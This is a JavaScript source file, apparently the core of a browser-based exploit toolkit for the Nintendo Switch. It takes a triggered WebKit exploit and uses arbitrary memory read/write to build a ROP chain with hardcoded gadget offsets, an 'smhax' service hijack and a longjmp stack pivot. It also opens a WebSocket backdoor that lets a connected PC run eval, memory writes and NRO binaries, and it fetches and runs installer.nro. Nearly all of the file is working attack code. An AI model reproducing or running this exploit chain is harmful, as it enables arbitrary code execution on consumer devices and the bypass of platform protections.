/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* eslint no-eval: "off" */
/* global alert, WebSocket */
var reservedWords = require('reserved-words');

var SploitCore = require('./sploitcore');
window.IPCMessage = require('./ipc');
var utils = require('./utils');
var runNro = require('./runNro');
var config = require('../config');
var SDBCore = require('./sdbcore');
var socket;

window.onerror = function (msg, url, line, col, error) {
	if (msg === 'Out of memory') { alert(msg); }

	var stack = error ? error.stack : null;

	utils.send('error', [line, msg, stack]);
	if (socket) {
		socket.send(JSON.stringify({
			type: 'error',
			response: [ line, msg, stack ]
		}));
	}
	// location.reload();
};

utils.log('Loaded');

function handler (sc, socket) {
	return function (event) {
		var data = JSON.parse(event.data);

		if (data.cmd === 'sp') {
			utils.log('running getSP()...');
			socket.send(JSON.stringify({
				type: 'gotsp',
				response: utils.paddr(sc.getSP())
			}));
		} else if (data.cmd === 'gc') {
			utils.log('running GC');
			sc.gc();
			socket.send(JSON.stringify({
				type: 'gcran'
			}));
		} else if (data.cmd === 'malloc') {
			var size = parseInt(data.args[0]);
			var addr = sc.malloc(size);
			socket.send(JSON.stringify({
				type: 'mallocd',
				response: utils.paddr(addr)
			}));
		} else if (data.cmd === 'free') {
			var addr = utils.parseAddr(data.args[0]);
			sc.free(addr);
		} else if (data.cmd === 'write4' || data.cmd === 'write8') {
			utils.log(JSON.stringify(data));
			var addr = utils.parseAddr(data.args[0]);
			var value = parseInt(data.args[1]);
			var offset = parseInt(data.args[2]) || 0;

			sc[data.cmd](value, addr, offset);
		} else if (data.cmd === 'read4' || data.cmd === 'read8') {
			var addr = utils.parseAddr(data.args[0]);
			var offset = parseInt(data.args[1]) || 0;

			var response = sc[data.cmd](addr, offset);

			socket.send(JSON.stringify({
				type: 'rread',
				response: response
			}));
		} else if (data.cmd === 'readstring') {
			var addr = utils.parseAddr(data.args[0]);
			var length = parseInt(data.args[1]) || 0;

			socket.send(JSON.stringify({
				type: 'rreadstring',
				response: sc.readString(addr, length)
			}));
		} else if (data.cmd === 'eval') {
			var words = Object.keys(reservedWords.KEYWORDS['6-strict']);
			var code = data.args.join(' ');
			var ret = true;
			if (~code.indexOf('window.response')) {
				ret = false;
			}
			for (var i = 0; i < words.length; i++) {
				var w = words[i];
				var s = code.substr(0, w.length);
				if (s === w) {
					ret = false;
				}
			}
			if (ret) {
				code = 'window.response = ' + code;
			}
			window.response = null;
			eval('with (sc) { ' + code + '}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: window.response || 'no output'
			}));
		} else if (data.cmd === 'evalfile') {
			var code = data.args[0];
			eval('with (sc) {\n' + code + '\n}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: 'no output'
			}));
		} else if (data.cmd === 'reboot') {
			socket.send(JSON.stringify({
				type: 'rebooting',
				response: 'Rebooting...'
			}));
			sc.ipcMsg(1).sendTo("bpc").assertOk();
		} else if (data.cmd === 'runnro') {
			runNro(data.args[0], data.args.slice(1));
			socket.send(JSON.stringify({
				type: 'rannro',
				response: 'no output'
			}));
		}
	};
}

function setupListener (sc) {
	socket = new WebSocket('ws://' + window.location.hostname + ':8100');

	var handlerFcn = handler(sc, socket);
	socket.onmessage = (evt) => {
		try {
			handlerFcn(evt);
		} catch (e) {
			window.onerror(e.message, null, e.line, null, e);
		}
	};

	socket.onopen = function () {
		sc.getService("set:cal", (setcal) => {
			socket.send(JSON.stringify({
				type: "identification",
				mac: sc.ipcMsg(6).sendTo(setcal).assertOk().data,
				version: sc.version
			}));
		});
		utils.log("Connected to PC...");
	};

	socket.onerror = function() {
		utils.log("socket error, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			socket.close();
			setupListener(sc);
		}, 5000);
	};
	
	socket.onclose = function() {
		utils.log("socket closed, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			utils.log("attempting to reconnect...");
			setupListener(sc);
		}, 5000);
	};
}

function main ()
{
    if (window.exploitMe === null)
    {
	utils.log('Exploit failed.');

	if (window.errmsg === null) {
            utils.log('Unknown reason.');
        } else {
            utils.log(window.errmsg);
        }

	utils.log('~~failed');
	window.location.reload();
	return;
    }

    utils.log('Exploit triggered. Beginning breakage.');
    var sc = window.sc = new SploitCore(window.exploitMe);

    if (window.location.href.indexOf("install") > -1)
    {
        // install
        this.sdb = new SDBCore(sc, sc.version);

        if (!this.sdb.initialized)
        {
            while (1)
                alert('Failed to pwn sdb!');
        }

        sc.getServices(["set:sys", "set:fd"], function (setsys, setfd) {
            var setSetting = function (session, cls, nam, value) { // session is set:fd
                var a = new Uint32Array(1);
                a[0] = value;
                var x1 = utils.str2ab(cls);
                var x2 = utils.str2ab(nam);
                return sc.ipcMsg(2).xDescriptor(x1, 48, 0).xDescriptor(x2, 48, 1).aDescriptor(a, 4, 0).sendTo(session).asResult();
            }

            utils.log("Setting ease_nro_restriction");
            setSetting(setfd, "ro", "ease_nro_restriction", 1).assertOk();
        });

        this.sdb.onready = function()
        {
            utils.log("Running installer.nro");
            var xhr = new XMLHttpRequest();
            xhr.open('GET', '/installer.nro', false);
	    xhr.overrideMimeType('text\/plain; charset=x-user-defined');
            xhr.send(null);

            if (xhr.status === 200)
            {
		nro = xhr.responseText;
		nro_u8 = new Uint8Array(nro.length);

		for(var i=0, j=nro.length; i<j; ++i) {
		    nro_u8[i] = nro.charCodeAt(i);
		}

		utils.log('length: ' + nro_u8.length);
                console.log(nro.length);

                sc.sdb = this.sdb;
                runNro(nro_u8, [], sc);
            }
        }
    }
    else
    {
	utils.log('scanning for code');
        var code_base = 0;

        var addr = [0, 0];
	do {
	    [base, size, state, perm] = sc.svcQueryMem(addr, true).assertOk();

            if (state == 3 || state == 4) {
                if (code_base == 0)
                    code_base = base;
                break;
            }

            addr = utils.add2(addr, size);
	} while (state !== 0x10);

	utils.log('found code: ' + code_base);

        function get_file(name) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', name, false);
	    xhr.overrideMimeType('text\/plain; charset=x-user-defined');
            xhr.send(null);

            content = xhr.responseText;

	    ret = new ArrayBuffer(content.length);
            u8view = new Uint8Array(ret);

	    for(var i=0, j=content.length; i<j; ++i) {
	        u8view[i] = content.charCodeAt(i);
	    }

            return ret;
        }

        pad_monitor = sc.read8(utils.add2(code_base, 0x4000+0x935318));
	utils.log('pad monitor: ' + pad_monitor);
        button_dynarr = utils.add2(pad_monitor, 8);
        button_array = sc.read8(button_dynarr);
	utils.log('button array: ' + button_array);
        button_ptr = utils.add2(button_array, 2*24);
        button_ptr = sc.read8(button_ptr);
        button_ptr = utils.add2(button_ptr, 12);

        rop = get_file('/rop.bin');
        rop_relocs = get_file('/rop_relocs.bin');

        var rop_len = rop.byteLength + 0;
        utils.log('rop length:' + rop_len);

        rop_mem = sc.getArrayBufferAddr(rop);

        rop32 = new Uint32Array(rop);
        rop_relocs32 = new Uint32Array(rop_relocs);

        utils.log('number of relocs:' + (rop_relocs32.length)/2);

        for (var i=0; i<rop_relocs32.length; i+=2) {
            //utils.log('i: ' + i);

            var type = rop_relocs32[i];
            var off  = rop_relocs32[i+1];

            //utils.log('relocs type: ' + type + ' offset: ' + off);
            var tmp = [
                rop32[off/4],
                rop32[off/4 + 1]
            ];
            //utils.log('relocs before: ' + tmp);

            if (type == 0) {
                tmp = utils.add2(tmp, rop_mem);
            }
            else if (type == 1) {
                tmp = utils.add2(tmp, code_base);
            }
            else if (type == 2) {
                tmp = button_ptr;
            }
            else {
                utils.log('unk reloc type');
            }

            //utils.log('relocs after: ' + tmp);
            rop32[off/4] = tmp[0];
            rop32[off/4 + 1] = tmp[1];
        }

        utils.log('memcpy');
        sc.call(utils.add2(code_base, 0x4000 + 0x46AA4C), [rop_mem, rop, rop_len]);

        utils.log('setup smhax');
        sm_obj = sc.read8(utils.add2(code_base, 0x4000 + 0x98F3E0));
        sc.write4(sc.smHandle[0], utils.add2(sm_obj, 12)); 

        utils.log('setup jmpbuf');
        var jmpbuf = new ArrayBuffer(0x100);
        var jmpbuf32 = new Uint32Array(jmpbuf);
        var pop_gadget = utils.add2(code_base, 0x4000 + 0x464358);
        jmpbuf32[0x58/4] = pop_gadget[0]; // lr
        jmpbuf32[0x5C/4] = pop_gadget[1];
        jmpbuf32[0x68/4] = rop_mem[0]; // sp
        jmpbuf32[0x6C/4] = rop_mem[1];

        utils.log('longjmp pivot');
        sc.call(utils.add2(code_base, 0x4000 + 0x4636C4), [jmpbuf]);

        utils.log('should not reach this');
    }
}

try {
	main();
} catch (e) {
	window.onerror(e.message, null, e.line, null, e);
}
